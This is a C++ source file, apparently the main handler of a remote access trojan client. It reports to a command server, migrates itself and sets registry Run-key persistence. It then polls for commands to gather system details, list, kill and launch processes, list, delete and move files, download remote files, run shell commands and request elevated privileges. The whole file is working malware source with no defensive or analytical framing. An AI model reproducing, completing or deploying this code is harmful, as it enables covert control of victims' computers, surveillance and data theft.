#include "Includes.h"
#include "_Config.h"

//-<Default>-//
#include "Implementation.h"
#include "Communication.h"
#include "Intelligence.h"
#include "Auxiliary.h"

//-<Modules>-//
#include "Shell.h"
#include "FileManager.h"
#include "ProcessManager.h"

class Handler {
public:
	void MainThread() {
		Communication.Address = SERVER_ADDRESS;
		Communication.Gateway = SERVER_GATEWAY;
		Communication.Agent = SERVER_AGENT;

		Communication.SendLog("Client has been started!", Intelligence.Client.UserHWID);
		if (CLIENT_MIGRATE) {
			std::string mPath;
			if (CLIENT_SET_TEMP) {
				mPath = GetTempPathC() + std::string(CLIENT_ROOT_NAME);
			} else {
				mPath = std::string(CLIENT_ROOT_PATH) + std::string(CLIENT_ROOT_NAME);
			}

			if (!FileExist(CLIENT_MIGRATION_POINT)) {
				if (GetCurrentPathC() == mPath ||
					RegExistsKey(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME)) {
					if (CLIENT_FIXATION) {
						if (!RegExistsKey(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME)) {
							if (Implementation.Fixation(true)) {
								Communication.SendLog("Client successfully implemented!", Intelligence.Client.UserHWID);
							} else {
								Communication.SendLog("The implementation process failed!", Intelligence.Client.UserHWID);
							}
						}
					}
				} else {
					if (Implementation.Migrate(mPath, true)) {
						Communication.SendLog("Client successfully migrated!", Intelligence.Client.UserHWID);
					} else {
						Communication.SendLog("Migration Error!", Intelligence.Client.UserHWID);
					}
					exit(0);
				}
			} else {
				DeleteFileA(CLIENT_MIGRATION_POINT);
			}
		}

		while (true) {
			Handle(Communication.Request(std::string("?id=") + Communication.Encode(Intelligence.Client.UserHWID) + 
				std::string("&key=") + Communication.Encode(SERVER_KEY) +
				std::string("&tag=") + Communication.Encode(CLIENT_TAG) +
				std::string("&marker=") + Communication.Encode("Indication")
			));
			Sleep(2000);
		}
	}

	void Handle(std::string Response) {
		std::string cType, cSubtype, cParam;
		
		cType = Response.substr(0, Response.find('.'));
		cSubtype = Response.substr(Response.find('.') + 1, Response.find('=') - Response.find('.') - 1);
		cParam = Response.substr(Response.find('=') + 1, Response.length() - 1);

		if (cType == "System") {
			if (cSubtype == "WMIRequest") {
				Communication.SendInfo(WMIRead(cParam), Intelligence.Client.UserHWID);
			}
		}

		if (cType == "Server") {
			if (cSubtype == "Config") {
				Communication.Request(std::string("?id=") + Communication.Encode(Intelligence.Client.UserHWID) +
					std::string("&key=") + Communication.Encode(SERVER_KEY) +
					std::string("&un=") + Communication.Encode(Intelligence.Client.UserName) +
					std::string("&mn=") + Communication.Encode(Intelligence.Client.MachineName) +
					std::string("&os=") + Communication.Encode(Intelligence.Client.OperatingSystem) +
					std::string("&dig=") + Communication.Encode(Intelligence.Client.Digit) +
					std::string("&cpu=") + Communication.Encode(Intelligence.Client.Processor) +
					std::string("&gpu=") + Communication.Encode(Intelligence.Client.VideoController) +
					std::string("&tram=") + Communication.Encode(Intelligence.Client.RAM) +
					std::string("&marker=") + Communication.Encode("Config"));
			}
		}

		if (cType == "Client") {
			if (cSubtype == "GetLocate") {
				Communication.SendInfo(GetCurrentPathC(), Intelligence.Client.UserHWID);
			}

			if (cSubtype == "GetAccess") {
				if (Intelligence.Client.Access) {
					Communication.SendInfo("Access: Admin", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("Access: User", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "GetStartup") {
				if (RegExistsKey(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME)) {
					Communication.SendInfo("An autoload is assigned to this file: " +
						RegReadKey(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME), Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("Autoload not assigned!", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "Migrate") {
				std::string cp1 = cParam.substr(0, cParam.find(','));
				std::string cp2 = cParam.substr(cParam.find(',') + 1, cParam.length() - cParam.find(',') - 1);
				CreateFile(std::string(CLIENT_MIGRATION_POINT).c_str(), GENERIC_WRITE,
					FILE_SHARE_READ,
					NULL, CREATE_NEW,
					FILE_ATTRIBUTE_NORMAL, NULL);
				if (Implementation.Migrate(cParam, true)) {
					Communication.SendLog("Migration was successful!", Intelligence.Client.UserHWID);
				} exit(0);
			}

			if (cSubtype == "Copy") {
				if (Implementation.Migrate(cParam, false)) {
					Communication.SendLog("Copy was made successfully!", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "Stop") {
				Communication.SendLog("Forced shutdown of the client!", Intelligence.Client.UserHWID);
				exit(0);
			}

			if (cSubtype == "Restart") {
				STARTUPINFO startinfo = { 0 };
				PROCESS_INFORMATION processInfo = { 0 };
				Communication.SendLog("Forced restart of the client!", Intelligence.Client.UserHWID);
				CreateProcess(GetCurrentPathC().c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &processInfo);
				exit(0);
			}

			if (cSubtype == "Startup") {
				if (cParam == "true") {
					if (Implementation.Fixation(true)) {
						Communication.SendLog("The implementation was successful!", Intelligence.Client.UserHWID);
					}
				} else if (cParam == "false") {
					if (Implementation.Fixation(false)) {
						Communication.SendLog("Successful deletion from autoload!", Intelligence.Client.UserHWID);
					}
				}
			}

			if (cSubtype == "PrivilegesUp") {
				Implementation.PrivilegeRequest();
			}
		}

		if (cType == "Process") {
			if (cSubtype == "List") {
				Communication.SendInfo(Intelligence.GetProcessListA(), Intelligence.Client.UserHWID);
			}

			if (cSubtype == "Kill") {
				if (ProcessManager.Kill(cParam)) {
					Communication.SendInfo("The process was successfully destroyed!", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("Error completing the process!", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "New") {
				if (ProcessManager.New(cParam)) {
					Communication.SendInfo("The process has been successfully launched!", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("The process failed!", Intelligence.Client.UserHWID);
				}
			}
		}

		if (cType == "File") {
			if (cSubtype == "List") {
				Communication.SendInfo(FileManager.List(cParam), Intelligence.Client.UserHWID);
			}

			if (cSubtype == "Delete") {
				if (DeleteFile(cParam.c_str())) {
					Communication.SendInfo("File successfully deleted!", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("Error deleting file!", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "Move") {
				std::string cp1 = cParam.substr(0, cParam.find(','));
				std::string cp2 = cParam.substr(cParam.find(',') + 1, cParam.length() - cParam.find(',') - 1);
				if (MoveFile(cp1.c_str(), cp2.c_str())) {
					Communication.SendInfo("File moved successfully!", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("File unsuccessfully moved!", Intelligence.Client.UserHWID);
				}
			}

			if (cSubtype == "Open") {
				FileManager.Open(cParam);
			}

			if (cSubtype == "Upload") {
				std::string cp1 = cParam.substr(0, cParam.find(','));
				std::string cp2 = cParam.substr(cParam.find(',') + 1, cParam.length() - cParam.find(',') - 1);
				if (Communication.Download(cp1, cp2)) {
					Communication.SendInfo("File uploaded successfully!", Intelligence.Client.UserHWID);
				} else {
					Communication.SendInfo("Error loading file!", Intelligence.Client.UserHWID);
				}
			}
		}

		if (cType == "Shell") {
			if (cSubtype == "Show") {
				Shell.Show(cParam);
			} else if (cSubtype == "Hide") {
				Shell.Hide(cParam);
			}
		}	

		if (cType == "Internet") {
			if (cSubtype == "Open") {
				ShellExecuteA(NULL, "open", cParam.c_str(), NULL, NULL, SW_SHOW);
			}
		}
	}
};